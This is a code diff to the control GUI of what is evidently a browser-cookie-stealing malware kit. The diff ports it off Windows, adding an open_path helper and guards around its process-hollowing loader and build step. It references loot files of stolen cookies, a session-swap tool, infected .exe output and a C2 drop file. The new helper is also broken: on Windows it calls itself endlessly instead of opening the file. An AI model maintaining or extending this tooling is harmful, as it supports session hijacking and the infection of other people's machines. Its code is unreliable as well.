@@ -105,6 +105,11 @@ def sys32():
         if os.path.isdir(nat): return nat
     return os.path.join(w, "System32")
 
+def open_path(p):
+    """os.startfile is Windows-only; xdg-open covers the Linux desktop."""
+    if sys.platform == "win32": open_path(p)
+    else: subprocess.Popen(["xdg-open", p])
+
 def pe(path):
     r = {"path": path, "kind": "nativo", "bits": "?", "gui": "?", "size": 0}
     try:
@@ -201,7 +206,7 @@ def sys_hosts():
     return [os.path.join(sys32(), n) for n in CURATED if os.path.exists(os.path.join(sys32(), n))]
 
 # ------------------------------------------------------------------ sink + loader
-NEWCONSOLE = 0x00000010
+NEWCONSOLE = 0x00000010 if sys.platform == "win32" else 0
 SINK_PROC = {"proc": None}
 
 def count_cookies():
@@ -223,6 +228,9 @@ def ensure_sink(log):
 def run(path, sink, kill, purge, timeout, extra, log=print):
     if not os.path.exists(LOADER):
         log("[-] missing %s (run build.bat)" % LOADER); return
+    if sys.platform != "win32":
+        log("[-] running the loader locally is Windows-only (PE + hollowing). Test on a Windows target.")
+        return
     before, _ = count_cookies()
 
     def _thread():
@@ -595,10 +603,10 @@ def gui():
     rb = ttk.Frame(root)
     rb.pack(fill="x", padx=12, pady=(0, 8))
     def show_json():
-        if os.path.exists(JSONF): os.startfile(JSONF)
+        if os.path.exists(JSONF): open_path(JSONF)
         else: L("[-] loot/cookies_all.json does not exist")
     def show_txt():
-        if os.path.exists(TXTF): os.startfile(TXTF)
+        if os.path.exists(TXTF): open_path(TXTF)
         else: L("[-] loot/cookies_all.txt does not exist")
     def open_swap():
         if not os.path.exists(JSONF):
@@ -613,20 +621,23 @@ def gui():
         except Exception as ex: L("[!] %s" % ex)
         L("[*] run: python swap.py <site> [--session] [--auth] [--keep]")
         swapdir = os.path.join(HERE, "swap")
-        if os.path.isdir(swapdir): os.startfile(swapdir)
-    def open_folder(): os.startfile(HERE)
+        if os.path.isdir(swapdir): open_path(swapdir)
+    def open_folder(): open_path(HERE)
     def open_ifec():
         ifec = os.path.join(HERE, "ifec")
-        if os.path.isdir(ifec): os.startfile(ifec)
+        if os.path.isdir(ifec): open_path(ifec)
         else: L("[-] ifec/ folder does not exist -- infect a .exe first")
     def open_loot():
-        if os.path.isdir(LOOT): os.startfile(LOOT)
+        if os.path.isdir(LOOT): open_path(LOOT)
         else: L("[-] loot/ folder does not exist")
     def open_drop():
         drop = r"C:\ProgramData\MediaCache\cache.json"
-        if os.path.exists(drop): os.startfile(drop)
+        if os.path.exists(drop): open_path(drop)
         else: L("[-] no drop.json (payload used C2 HTTP or pipe)")
     def do_build():
+        if sys.platform != "win32":
+            L("[-] build needs Windows (MSVC + build.bat). On Linux use the prebuilt bin/ copied from a Windows build.")
+            return
         L("[*] rebuilding binaries...")
         r = subprocess.run(["cmd", "/c", os.path.join(HERE, "build.bat")],
                            cwd=HERE, capture_output=True, text=True, timeout=60)
